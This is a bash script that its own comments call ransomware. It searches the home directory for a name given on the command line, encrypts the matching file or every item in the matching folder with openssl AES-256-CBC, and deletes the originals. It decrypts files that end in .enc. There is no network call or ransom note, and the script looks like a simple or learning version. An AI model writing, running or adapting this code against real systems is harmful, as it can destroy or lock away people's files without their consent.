#!/bin/bash


CURRENT_DIR=$(pwd)

# usage
if [[ "$#" -eq 0 ]]; then
    echo "Usage : $0 <directory_to_encrypt || directory_to_decrypt> <password>"
    exit 1
fi

PASSWORD="$2"
if [[ -z "$PASSWORD" ]]; then
    echo "No password provided. Exiting."
    exit 1
fi
# ransomewa
set_encryption(){
    repo="$1"

    if [[ -f "$repo" ]]; then
        echo "Encrypting file: $repo"
        openssl enc -aes-256-cbc -salt \
            -in "$repo" \
            -out "$repo.enc" \
            -pass pass:"$PASSWORD"
        rm "$repo"  # Remove original file after encryption

    elif [[ -d "$repo" ]]; then
        echo "Encrypting directory: $repo"

        archive_name="${repo}.tar.gz"
        encrypted_name="${archive_name}.enc"

        # Compress the directory
        tar -czf "$archive_name" "$repo"

        # Encrypt the compressed archive
        openssl enc -aes-256-cbc -salt \
            -in "$archive_name" \
            -out "$encrypted_name" \
            -pass pass:"$PASSWORD"

        # Remove original archive and optionally the folder
        rm -r "$repo" "$archive_name"

        echo "Folder '$repo' has been encrypted as '$encrypted_name'"

    else
        echo "Skipping unknown type: $repo"
    fi
}

# decrypt ransomware
decrypt_encryption(){
    repo="$1"

    if [[ "$repo" == *.tar.gz.enc ]]; then
        echo "Decrypting folder archive: $repo"

        decrypted_archive="${repo%.enc}"  # Removes .enc
        output_folder="${decrypted_archive%.tar.gz}"  # Original folder name

        # Decrypt the encrypted archive
        openssl enc -d -aes-256-cbc \
            -in "$repo" \
            -out "$decrypted_archive" \
            -pass pass:"$PASSWORD"

        # Extract the decrypted archive
        tar -xzf "$decrypted_archive"

        # Cleanup
        rm -r "$decrypted_archive" "$repo"
        echo "Decrypted and extracted folder: $output_folder"

    elif [[ "$repo" == *.enc ]]; then
        echo "Decrypting file: $repo"
        decrypted_file="${repo%.enc}"
        openssl enc -d -aes-256-cbc \
            -in "$repo" \
            -out "$decrypted_file" \
            -pass pass:"$PASSWORD"

        rm -r "$repo"  # Remove the encrypted file after decryption
    else
        echo "Skipping unknown type: $repo"
    fi
}

TARGET="$1"

# Safely find the target directory
TARGET_DIR=$(find ~/ -type d -name "${TARGET}*" 2>/dev/null | head -n 1)
TARGET_IS_FILE=$(find ~/ -type f -name "${TARGET}*" 2>/dev/null | head -n 1)

if [[ "$TARGET_IS_FILE" ]]; then
    if [[ "$TARGET_IS_FILE" == *.enc ]]; then
        decrypt_encryption "$TARGET_IS_FILE"
    else 
        set_encryption "$TARGET_IS_FILE"
    fi
    exit 0
fi

# Check if TARGET_DIR was found
if [[ -z "$TARGET_DIR" &&  -z "$TARGET_IS_FILE" ]]; then
    echo "File or Directory matching '$TARGET*' not found under home directory."
    exit 1
fi

# List all items inside the found directory
mapfile -t ALL_REPOS < <(ls "$TARGET_DIR")

# Move into the found directory
cd "$TARGET_DIR" || { echo "Failed to enter directory: $TARGET_DIR"; exit 1; }

# Loop through and run ransomeware() on each item
for repo in "${ALL_REPOS[@]}"; do
    if [[ -f "$repo" || -d "$repo" ]]; then
        if [[ "$repo" == *.enc || "$repo" == *.tar.gz.enc  ]]; then
            decrypt_encryption "$repo"
        else
            set_encryption "$repo"
        fi
    else
        echo "Skipping unknown item: $repo"
    fi
done










cd "$CURRENT_DIR"
